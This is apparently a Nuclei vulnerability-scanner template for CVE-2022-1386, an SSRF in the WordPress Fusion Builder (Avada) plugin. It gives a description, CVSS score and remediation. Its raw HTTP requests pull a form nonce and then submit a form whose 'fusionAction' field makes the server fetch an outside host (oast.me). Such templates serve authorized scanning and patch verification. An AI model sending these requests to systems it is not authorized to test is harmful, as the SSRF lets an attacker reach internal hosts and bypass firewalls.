id: CVE-2022-1386

info:
  name: WordPress Fusion Builder <3.6.2 - Server-Side Request Forgery
  author: akincibor,MantisSTS,calumjelrick
  severity: critical
  description: |
    WordPress Fusion Builder plugin before 3.6.2 is susceptible to server-side request forgery. The plugin does not validate a parameter in its forms, which can be used to initiate arbitrary HTTP requests. The data returned is then reflected back in the application's response. An attacker can potentially interact with hosts on the server's local network, bypass firewalls, and access control measures.
  remediation: |
    Update to the latest version of WordPress Fusion Builder plugin (3.6.2) or apply the vendor-provided patch.
  reference:
    - https://wpscan.com/vulnerability/bf7034ab-24c4-461f-a709-3f73988b536b
    - https://www.rootshellsecurity.net/rootshell-discovered-a-critical-vulnerability-in-top-wordpress-theme/
    - https://theme-fusion.com/version-7-6-2-security-update/
    - https://nvd.nist.gov/vuln/detail/CVE-2022-1386
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-1386
    cwe-id: CWE-918
    epss-score: 0.18525
    epss-percentile: 0.95708
    cpe: cpe:2.3:a:theme-fusion:avada:*:*:*:*:*:wordpress:*:*
  metadata:
    max-request: 2
    vendor: theme-fusion
    product: avada
    framework: wordpress
  tags: wpscan,cve,cve2022,wordpress,ssrf,themefusion,wp,fusion,avada,intrusive,theme-fusion

http:
  - raw:
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Origin: {{BaseURL}}
        Referer: {{RootURL}}

        action=fusion_form_update_view
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=---------------------------30259827232283860776499538268
        Origin: {{BaseURL}}
        Referer: {{RootURL}}

        -----------------------------30259827232283860776499538268
        Content-Disposition: form-data; name="formData"

        email=example%40example.com&fusion_privacy_store_ip_ua=false&fusion_privacy_expiration_interval=48&priva
        cy_expiration_action=ignore&fusion-form-nonce-0={{fusionformnonce}}&fusion-fields-hold-private-data=
        -----------------------------30259827232283860776499538268
        Content-Disposition: form-data; name="action"

        fusion_form_submit_form_to_url
        -----------------------------30259827232283860776499538268
        Content-Disposition: form-data; name="fusion_form_nonce"

        {{fusionformnonce}}
        -----------------------------30259827232283860776499538268
        Content-Disposition: form-data; name="form_id"

        0
        -----------------------------30259827232283860776499538268
        Content-Disposition: form-data; name="post_id"

        0
        -----------------------------30259827232283860776499538268
        Content-Disposition: form-data; name="field_labels"

        {"email":"Email address"}
        -----------------------------30259827232283860776499538268
        Content-Disposition: form-data; name="hidden_field_names"

        []
        -----------------------------30259827232283860776499538268
        Content-Disposition: form-data; name="fusionAction"

        https://oast.me
        -----------------------------30259827232283860776499538268
        Content-Disposition: form-data; name="fusionActionMethod"

        GET
        -----------------------------30259827232283860776499538268--

    matchers-condition: and
    matchers:
      - type: word
        part: body_2
        words:
          - Interactsh Server

      - type: status
        status:
          - 200

    extractors:
      - type: xpath
        name: fusionformnonce
        internal: true
        xpath:
          - //*[@id="fusion-form-nonce-0"]
        attribute: value
        part: body_1
# digest: 490a004630440220596b5fefbb23e8be4e05e46186e1a267d087c3ecab06b1d75631e732d78ea1d702204f6c1283bced89b2cb419f35932d972d91c3b576777a759dc5efb69958f512ec:922c64590222798bb761d5b6d8e72950